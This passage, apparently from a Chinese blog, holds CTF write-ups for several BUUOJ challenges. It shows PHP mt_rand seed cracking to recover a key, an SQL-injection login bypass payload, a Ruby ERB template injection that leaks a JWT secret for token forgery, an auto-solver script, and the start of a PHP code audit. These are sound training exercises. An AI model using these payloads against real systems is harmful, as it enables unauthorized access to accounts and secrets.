</span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Public_key</span> = public_key();</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>php低版本的mt种子问题，写个脚本导出值，然后php_mt_seed一把梭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">public_key = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+]Result is: &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> public_key:</span><br><span class="line">    print(<span class="built_in">str</span>(char.index(i)) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(char.index(i)) + <span class="string">&quot; 0 &quot;</span> + <span class="string">&quot;61&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p>一把梭。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210808112013845.png"></p><p>得到的值在php[5.2.1 - 7.0.x]重新计算私钥的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1775196155</span>);</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    private_key();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line">public_key();</span><br></pre></td></tr></table></figure><blockquote><p>XuNhoueCDCGc</p></blockquote><p>有私钥的值直接登陆即可，密码那还有个简单sql。</p><blockquote><p>Private_key=XuNhoueCDCGc&amp;login=登录&amp;password=’+or+’1’=’1&amp;username=crispr</p></blockquote><p>得到flag</p><blockquote><p>flag{9227093c-e6ac-4b87-b77b-516945f26eda}</p></blockquote><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>evoA师傅出的题，这里简单讲讲预期解，非预期解也挺有意思的，具体可以看看<a href="https://evoa.me/archives/15/">evoA师傅的博客</a>讲的更详细点。</p><h3 id="ruby模板注入"><a href="#ruby模板注入" class="headerlink" title="ruby模板注入"></a>ruby模板注入</h3><p>在/robots.txt里可以看到提示，存在/filebak路由，直接给出了源码。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread <span class="keyword">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>可以看出是ruby的erb模板注入，核心代码就是这个</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>if成立则会弹出name参数的前七个字符值，这里就限制了七字符的模板注入，erb模板的注入格式为<code>&lt;%=%&gt;</code>，显然这里就占了五个字符了那么我们可控的就只有两个字符，这里可以使用ruby的<a href="https://docs.ruby-lang.org/en/2.4.0/globals_rdoc.html">预定义全局变量</a> <code>$&#39;</code>，即会返回上次成功匹配右值的字符串。</p><blockquote><p>$’</p><p>The string to the right of the last successful match.</p></blockquote><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113513038.png"></p><p>tips：特殊字符需要urlencode</p><p>有秘钥了就直接<a href="https://jwt.io/">JWT</a>一把梭。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210810113831546.png"></p><p>flag_here</p><blockquote><p>flag{845aa3fa-8612-4c76-8f81-d6aa00f46882}</p></blockquote><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>大数字计算器，写个脚本自动算就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span>(<span class="params">n1, sl, n2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 + n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 - n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 * n2</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> sl:</span><br><span class="line">        <span class="keyword">return</span> n1 / n2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a3187c44-2492-4ad0-aac5-3bfbd8ad2de4.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">res = s.get(url=url)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1005</span>):</span><br><span class="line">    char = re.search(<span class="string">r&#x27;&gt;&lt;br&gt;(\d*)(\D*)(\d*)&lt;br&gt;&lt;br&gt;&lt;form&#x27;</span>, res.text)</span><br><span class="line">    num1 = <span class="built_in">int</span>(char.group(<span class="number">1</span>))</span><br><span class="line">    num2 = <span class="built_in">int</span>(char.group(<span class="number">3</span>))</span><br><span class="line">    symbol = char.group(<span class="number">2</span>)</span><br><span class="line">    result = calculate(num1, symbol, num2)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>: result</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.post(url=url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">f&quot;[+]Now is:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>flag{b387e80e-8d04-454e-b5b4-720d176c82ba}</p></blockquote><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>index最下面可以看到一段话。</p><blockquote><p>Hello, my colleague.</p><p>Some of the features on our website have not been completed. I have uploaded the source code to github. When you have time, remember to continue.</p></blockquote><p>提示可以去到作者的github仓库中找到源码。</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210812104433141.png"></p><p>下载源码下来代码审计，主要是show.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./helper.php&quot;</span>);</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;delete_all&quot;</span>] == <span class="string">&quot;true&quot;</span>)&#123;</span><br><span class="line">        <span class="variable">$show</span>-&gt;Delete_All_Images();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$show</span>-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc())&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>])&#123;</span><br><span class="line">                    <span class="variable">$attr_temp</span> = str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.chr(<span class="number">0</span>), <span class="variable">$row</span>[<span class="string">&quot;attr&quot;</span>]);</span><br><span class="line">                    <span class="variable">$attr</span> = unserialize(<span class="variable">$attr_temp</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;id=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>].<span class="string">&quot; filename=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>].<span class="string">&quot; path=&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;DELETE FROM images&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="keyword">$this</span>-&gt;con, <span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和helper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$folder</span> = <span class="string">&quot;pic/&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ifview</span> = <span class="literal">False</span>; </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="string">&quot;config.txt&quot;</span>;</span><br><span class="line">    <span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$fileinfo</span> = <span 